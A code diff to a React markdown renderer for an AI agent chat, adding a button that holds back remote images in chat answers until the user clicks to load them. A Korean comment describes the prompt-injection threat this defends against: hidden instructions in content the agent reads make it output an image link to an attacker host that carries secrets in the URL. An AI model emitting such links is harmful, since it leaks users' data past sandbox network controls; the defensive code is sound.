@@ -355,13 +355,45 @@ function MdImg(props: React.ImgHTMLAttributes<HTMLImageElement> & { node?: unkno
   return <img src={url} {...rest} />;
 }
 
+/**
+ * 채팅 답변의 원격 이미지는 눌러야 불러온다. 그리는 순간 main 이 그 주소로 요청을 보내므로, 에이전트가 읽은 페이지·파일의
+ * 숨은 지시로 ![](https://공격자/?d=<비밀>) 을 내놓으면 아무것도 누르지 않아도 내용이 밖으로 나간다(샌드박스의 네트워크 차단도 비켜 간다).
+ * 문서 미리보기는 저장소의 README 그대로라 지금처럼 바로 그린다.
+ */
+function MdChatImg(props: React.ImgHTMLAttributes<HTMLImageElement> & { node?: unknown }) {
+  const { t } = useTranslation();
+  const [allowed, setAllowed] = useState(false);
+  const { src } = props;
+  if (!allowed && typeof src === "string" && /^https?:/i.test(src)) {
+    let host = src;
+    try {
+      host = new URL(src).host;
+    } catch {
+      /* 그대로 보인다 */
+    }
+    return (
+      <button
+        type="button"
+        onClick={() => setAllowed(true)}
+        title={src}
+        data-remote-image
+        className="inline-flex items-center gap-1 rounded border border-line px-1.5 py-0.5 text-[11px] text-muted hover:text-fg"
+      >
+        {props.alt ? `${props.alt} · ` : ""}
+        {t("chat.markdown.loadRemoteImage", { host })}
+      </button>
+    );
+  }
+  return <MdImg {...props} />;
+}
+
 const REMARK_PLUGINS: Options["remarkPlugins"] = [[remarkGfm, { singleTilde: false }]];
 const CHAT_REHYPE: Options["rehypePlugins"] = [rehypeHighlight, rehypeFileRefs];
 // 문서(README 등)는 HTML 도 그린다 — <p align>·<img width>·배지. 정리(sanitize)는 하이라이트 전에 둬야 hljs 클래스가 남는다.
 // 기본 정리는 href 의 file: 을 지운다. 로컬 파일 링크는 MdLink 가 에디터로만 보내므로 그 스킴만 더한다.
 const DOC_SANITIZE = { ...defaultSchema, protocols: { ...defaultSchema.protocols, href: [...(defaultSchema.protocols?.href ?? []), "file"] } };
 const DOC_REHYPE: Options["rehypePlugins"] = [rehypeRaw, [rehypeSanitize, DOC_SANITIZE], rehypeHighlight, rehypeFileRefs];
-const CHAT_COMPONENTS: Options["components"] = { a: MdLink, span: MdSpan, code: MdCode, pre: MdPre, img: MdImg };
+const CHAT_COMPONENTS: Options["components"] = { a: MdLink, span: MdSpan, code: MdCode, pre: MdPre, img: MdChatImg };
 const DOC_COMPONENTS: Options["components"] = { ...CHAT_COMPONENTS, img: MdImg };
 
 /** variant "doc": 파일 미리보기처럼 문서 한 편을 읽는 화면. 채팅보다 큰 제목·넉넉한 간격·읽기 좋은 폭(styles.css .md-doc). */
